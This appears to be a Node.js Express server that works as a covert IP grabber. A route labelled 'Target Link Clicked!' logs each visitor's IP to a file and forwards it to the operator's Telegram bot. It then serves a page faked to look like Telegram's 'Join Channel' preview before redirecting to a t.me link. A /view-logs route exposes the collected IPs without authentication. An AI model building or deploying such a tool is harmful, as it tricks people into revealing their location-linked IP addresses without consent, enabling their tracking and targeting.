const express = require('express');
const fs = require('fs'); 
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/uUl8iPwh5iYTVk', async (req, res) => {
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log("Target Link Clicked! Visitor IP: " + visitorIp);
    
    // 1. الكتابة في الملف (كما طلبت)
    const logEntry = `${new Date().toISOString()} - IP: ${visitorIp}\n`;
    fs.appendFile('ips.txt', logEntry, (err) => {
        if (err) console.log("Error writing to file: ", err);
    });

    // 2. إرسال تنبيه لتليجرام
    try {
        const token = process.env.TELEGRAM_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        const message = `🚨 New Visitor IP Detected!\nIP: ${visitorIp}\nTime: ${new Date().toISOString()}`;
        
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message })
        });
    } catch (err) {
        console.log("Telegram Error: ", err);
    }
    
    // 3. التوجيه
    res.send(`
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <title>Telegram: Join Channel</title>
            <meta property="og:title" content="Telegram: Join Channel">
            <meta property="og:description" content="اضغط للانضمام إلى القناة الرسمية عبر تليغرام">
            <meta property="og:image" content="https://telegram.org/img/t_logo.png">
            <meta property="og:type" content="website">
            <script>
                window.location.href = "https://t.me/uUl8iPwh5iYTVk";
            </script>
        </head>
        <body>
            <p style="text-align: center; margin-top: 50px; font-family: sans-serif; color: #555;">جاري فتح تليغرام...</p>
        </body>
        </html>
    `);
});

app.get('/view-logs', (req, res) => {
    fs.readFile('ips.txt', 'utf8', (err, data) => {
        if (err) {
            return res.send('لا توجد أي زيارات مسجلة حتى الآن.');
        }
        res.type('text/plain').send(data);
    });
});

app.get('/', (req, res) => {
    res.send('Server is active.');
});

// هذا السطر مطلوب لـ Vercel
module.exports = app;

app.listen(PORT, () => {
    console.log("Server is running...");
});
